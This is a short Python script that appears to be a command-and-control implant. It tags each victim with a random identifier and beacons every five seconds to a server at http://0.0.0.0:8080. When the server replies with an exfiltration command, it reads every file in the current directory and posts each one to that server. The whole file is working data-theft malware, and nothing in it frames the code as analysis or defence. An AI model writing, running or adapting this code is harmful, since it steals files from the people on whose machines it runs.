import os
import requests
import time
import random
import string
import base64
from os.path import isfile, join

## Send out beacons for 60secs at 5secs interval
def beacon(identifier):
    start_time = time.time()
    url = 'http://0.0.0.0:8080'
    while True:
        
        cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
        r = requests.get(url=url,cookies = cookies)

        ## Exfiltrate command sent from server
        if r.text == 'Exfiltration command detected':
            exfiltration(identifier)

        time.sleep(5)

def exfiltration(identifier):
    ## Getting list of files in current directory
    # files = [f for f in os.listdir('.') if f.isfile]

    for f in os.listdir('.'):
        if isfile(join('.', f)):
            print(f)
            ## wb enables to read bianry
            content = open(f,"rb").read()
            
            ## Sending out data
            url = 'http://0.0.0.0:8080'
            cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
            custom_headers = {'filename':f}
            r = requests.post(url = url,cookies = cookies, headers = custom_headers, data = content)

def main():
    ## Will identify the victim
    identifier = ''.join(random.choices(string.ascii_uppercase +string.digits, k = 10))
    beacon(identifier)
    
if __name__=="__main__":
    main()